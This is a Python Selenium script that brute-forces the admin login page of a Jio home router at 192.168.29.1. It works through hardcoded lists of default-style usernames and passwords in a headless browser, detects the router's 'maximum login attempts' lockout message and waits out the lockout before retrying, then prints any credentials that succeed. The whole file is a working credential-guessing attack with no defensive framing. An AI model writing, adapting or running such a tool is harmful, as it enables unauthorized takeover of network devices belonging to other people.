from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from time import sleep

# Your username and password lists
usernames = [
    "admin",
    "jioadmin",
    "user",
    "Admin",
    "root",
    # Add more usernames
]

passwords = [
    "Jiocentrum",
    "admin",
    "password",
    "Jio12345",
    "jiocentrum123",
    "Admin123",
    "jio2025",
    "admin2025",
]

# Router details
router_url = "http://192.168.29.1"  # Use "http://jiofi.local.html" for JioFi
timeout_seconds = 600  # 600s for lockout period
max_attempts_before_pause = 5  # Adjust based on lockout threshold (e.g., 3-5 attempts)

# Set up Selenium with Chrome
service = Service(r'C:\Users\Username\Downloads\chromedriver-win64\chromedriver-win64\chromedriver.exe')  # Verify path
options = webdriver.ChromeOptions()
options.add_argument('--headless')  # Run in headless mode
driver = webdriver.Chrome(service=service, options=options)

def try_login(username, password):
    try:
        # Navigate to login page
        driver.get(router_url)
        
        # Wait for username and password fields
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "users.username")))
        
        # Enter credentials
        username_field = driver.find_element(By.NAME, "users.username")
        username_field.clear()
        username_field.send_keys(username)
        
        password_field = driver.find_element(By.NAME, "users.password")
        password_field.clear()
        password_field.send_keys(password)
        
        # Click login button
        login_button = driver.find_element(By.NAME, "button.login.users.dashboard")
        login_button.click()
        
        # Check for lockout message
        try:
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Access denied, maximum login attempts reached')]")))
            print(f"Lockout detected for Username: {username}, Password: {password}. Waiting {timeout_seconds}s...")
            return "lockout"
        except TimeoutException:
            pass
        
        # Check for failure message
        try:
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, "div.msgError p")))
            error_message = driver.find_element(By.CSS_SELECTOR, "div.msgError p").text
            if "Invalid username or password" in error_message:
                print(f"Failed: Username: {username}, Password: {password}")
                return False
        except TimeoutException:
            # Check for success (e.g., URL change or dashboard element)
            try:
                WebDriverWait(driver, 10).until(EC.url_changes(router_url))
                print(f"Success! Username: {username}, Password: {password} (URL changed)")
                return True
            except TimeoutException:
                # Look for a dashboard element (adjust based on router's dashboard)
                try:
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Dashboard') or contains(text(), 'Settings') or contains(text(), 'Status') or contains(text(), 'Management')]")))
                    print(f"Success! Username: {username}, Password: {password} (Dashboard detected)")
                    return True
                except TimeoutException:
                    print(f"Ambiguous response for Username: {username}, Password: {password}. Possible loading issue or redirect.")
                    return False
    except Exception as e:
        print(f"Error with Username: {username}, Password: {password}. Error: {str(e)}")
        return False

# Try all combinations
attempt_count = 0
for username in usernames:
    for password in passwords:
        attempt_count += 1
        print(f"Attempt {attempt_count}: Trying Username: {username}, Password: {password}")
        
        result = try_login(username, password)
        if result == True:
            break  # Stop on success
        elif result == "lockout":
            print(f"Pausing for {timeout_seconds} seconds due to lockout...")
            sleep(timeout_seconds)
            attempt_count -= 1  # Retry the same attempt after lockout
            continue
        else:
            if attempt_count % max_attempts_before_pause == 0:
                print(f"Pausing for {timeout_seconds} seconds to avoid further lockouts...")
                sleep(timeout_seconds)
            sleep(2)  # Short delay between attempts

# Close browser
driver.quit()
print("Script completed. If no success, try safer methods or contact support.")